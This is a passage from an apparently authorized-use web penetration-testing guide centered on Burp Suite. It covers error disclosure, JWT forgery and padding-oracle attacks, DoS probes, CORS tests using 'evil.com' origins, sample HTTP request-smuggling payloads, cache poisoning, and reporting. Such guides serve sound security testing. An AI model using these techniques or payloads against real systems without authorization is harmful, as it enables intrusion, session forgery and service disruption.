- Look for `unsafe-inline`, `unsafe-eval` — weakens XSS protection.
- Check for overly permissive sources: `*`, `data:`, `blob:`.
- Look for CSP bypass via allowed CDNs that host user-controllable content (e.g., `accounts.google.com` for JSONP).
- Use the CSP Evaluator tool for automated analysis.

---

## 24. Error Handling & Information Disclosure

### 24.1 Trigger Error Conditions

| Technique | Purpose |
|-----------|---------|
| Invalid input types | String where integer expected, vice versa. |
| Boundary values | Very large numbers, empty strings, special characters. |
| Invalid HTTP methods | `PATCH`, `PROPFIND` on standard endpoints. |
| Missing parameters | Remove required parameters. |
| Malformed requests | Corrupt Content-Type, invalid JSON/XML. |
| Non-existent resources | Random URLs to trigger 404 pages. |

### 24.2 Information to Look For

- Stack traces with code paths and line numbers.
- Database type and version from SQL errors.
- Internal IP addresses and hostnames.
- Software versions (web server, framework, OS).
- Debug information and verbose error messages.
- Source code snippets in error responses.

### 24.3 Burp Workflow

1. Use **Intruder** to fuzz parameters with error-triggering payloads.
2. Configure **Grep – Match** for patterns: `exception`, `stack trace`, `error`, `debug`, `SQL`, `ORA-`, `MySQL`, `at line`.
3. Review all unique error pages in the results.

---

## 25. Cryptography Testing

### 25.1 Token & Session Analysis

1. Collect tokens using **Sequencer** (minimum 200 samples).
2. Check for:
   - Low entropy (predictable tokens).
   - Sequential patterns.
   - Timestamp-based tokens.
   - Weak hashing (MD5, SHA1 without salt).

### 25.2 JWT Testing

Use the **JWT Editor** extension:

| Attack | Method |
|--------|--------|
| `alg: none` | Change algorithm to `none`, remove signature. |
| `alg: HS256` with public key | If app uses RS256, switch to HS256 and sign with the public key. |
| Key confusion | Swap RS256 → HS256 using the RSA public key as HMAC secret. |
| `kid` injection | `"kid": "../../dev/null"` → sign with empty secret. |
| `jku`/`x5u` spoofing | Point to attacker-controlled JWKS. |
| Claim manipulation | Change `sub`, `role`, `admin` claims. |
| Expired token | Use expired tokens — are they still accepted? |

### 25.3 Padding Oracle

- Identify CBC-encrypted tokens (cookies, parameters).
- Use Intruder to systematically modify ciphertext bytes.
- Monitor for different error responses (valid padding vs. invalid padding).
- Use **PadBuster** or custom scripts to decrypt/forge tokens.

---

## 26. Rate Limiting & Denial of Service

### 26.1 Rate Limiting Tests

| Endpoint | Test |
|----------|------|
| Login | Send 100+ requests with Intruder — is there lockout? |
| Registration | Mass create accounts. |
| Password reset | Flood reset requests for a single user. |
| API endpoints | Check for per-user and per-IP rate limits. |
| File upload | Upload very large files. |
| Search | Complex queries that may be expensive. |

### 26.2 Application-Level DoS

- **Regex DoS (ReDoS)**: Submit strings that cause catastrophic backtracking.
- **XML bomb**: `<!ENTITY a "aaa...">` nested entity expansion.
- **Hash collision**: Submit many parameters with colliding hash values.
- **Long strings**: Very long input in all fields.
- **Recursive queries**: Deeply nested GraphQL or JSON.

> **Note**: Only test DoS with explicit authorization and in a controlled manner. Coordinate with the client.

---

## 27. CORS Misconfiguration

### 27.1 Testing

1. In **Repeater**, add the `Origin` header with various values:

```
Origin: https://evil.com
Origin: https://target.com.evil.com
Origin: https://evil-target.com
Origin: null
```

2. Check the response for:

```
Access-Control-Allow-Origin: https://evil.com     ← Reflects arbitrary origin
Access-Control-Allow-Credentials: true             ← Allows cookies
```

### 27.2 Exploitation Impact

If both conditions are met, an attacker's site can:
- Read authenticated responses.
- Steal sensitive data via cross-origin requests.
- Perform authenticated actions.

### 27.3 Dangerous Configurations

| Configuration | Risk |
|--------------|------|
| `Access-Control-Allow-Origin: *` with credentials | Browsers block this, but check implementation. |
| Origin reflection with `Allow-Credentials: true` | Full cross-origin data theft. |
| `null` origin allowed with credentials | Exploitable via sandboxed iframe. |
| Subdomain wildcard matching | Compromised subdomain can steal data. |
| Regex bypass | `evil.com.target.com` matches `*.target.com`. |

---

## 28. HTTP Request Smuggling

### 28.1 Detection

Use the **HTTP Request Smuggler** extension:

1. Right-click a request → Extensions → HTTP Request Smuggler → Smuggle Probe.
2. The extension tests CL.TE, TE.CL, and TE.TE variants.

### 28.2 Manual Testing in Repeater

> **Important**: Disable "Update Content-Length" in Repeater for these tests.

#### CL.TE

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

#### TE.CL

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### 28.3 Exploitation

- **Bypass front-end access controls** by smuggling requests to restricted paths.
- **Poison web cache** by smuggling responses.
- **Hijack other users' requests** by prepending partial requests.
- **Deliver XSS** without user interaction.

---

## 29. Cache Poisoning

### 29.1 Detection

1. Use **Param Miner** extension → right-click → "Guess headers."
2. Identify unkeyed inputs (headers that affect response but aren't part of cache key).
3. Common unkeyed inputs:
   - `X-Forwarded-Host`
   - `X-Forwarded-Scheme`
   - `X-Original-URL`
   - `X-Rewrite-URL`

### 29.2 Exploitation

1. Identify an unkeyed header that is reflected in the response.
2. Inject a malicious value (e.g., XSS payload in `X-Forwarded-Host`).
3. Send the request until the poisoned response is cached.
4. Verify by requesting the URL without the injected header — the cached malicious response should be served.

---

## 30. Reporting & Cleanup

### 30.1 Burp Reporting

1. **Target → Site map** → right-click → **"Issues" → "Report issues for this host"**.
2. Select report format: HTML (recommended for clients) or XML.
3. Include:
   - Issue detail with full request/response pairs.
   - Severity and confidence ratings.
   - Remediation guidance.

### 30.2 Manual Report Structure

For each finding, document:

| Section | Content |
|---------|---------|
| **Title** | Clear vulnerability name. |
| **Severity** | Critical / High / Medium / Low / Informational (use CVSS 3.1). |
| **Description** | What the vulnerability is. |
| **Affected URL/Parameter** | Exact location. |
| **Steps to Reproduce** | Numbered steps with screenshots / request-response pairs. |
| **Impact** | What an attacker can achieve. |
| **Evidence** | Burp screenshots, request/response pairs. |
| **Remediation** | Specific fix recommendations. |
| **References** | OWASP, CWE, CVE links. |

### 30.3 Cleanup

- Delete any test accounts created during testing.
- Remove any uploaded test files.
- Revert any configuration changes made during testing.
- Notify the client of any persistent changes that could not be reverted.
- Securely store or destroy testing data per the engagement agreement.

---

## Quick Reference — Testing Priority by Risk

| Priority | Category | OWASP Top 10 |
|----------|----------|--------------|
| 1 | SQL Injection | A03:2021 – Injection |
| 2 | Authentication Flaws | A07:2021 – Identification and Authentication Failures |
| 3 | Access Control (IDOR, Privilege Escalation) | A01:2021 – Broken Access Control |
| 4 | XSS (Stored > Reflected > DOM) | A03:2021 – Injection |
| 5 | SSRF | A10:2021 – Server-Side Request Forgery |
| 6 | Insecure Deserialization | A08:2021 – Software and Data Integrity Failures |
| 7 | XXE | A05:2021 – Security Misconfiguration |
| 8 | CSRF | A01:2021 – Broken Access Control |
| 9 | File Upload | A04:2021 – Insecure Design |
| 10 | Business Logic | A04:2021 – Insecure Design |
| 11 | Security Headers & TLS | A02:2021 – Cryptographic Failures |
| 12 | Information Disclosure | A05:2021 – Security Misconfiguration |

---

*This guide is intended for authorized penetration testing engagements only. Always obtain written permission before testing any system you do not own.*
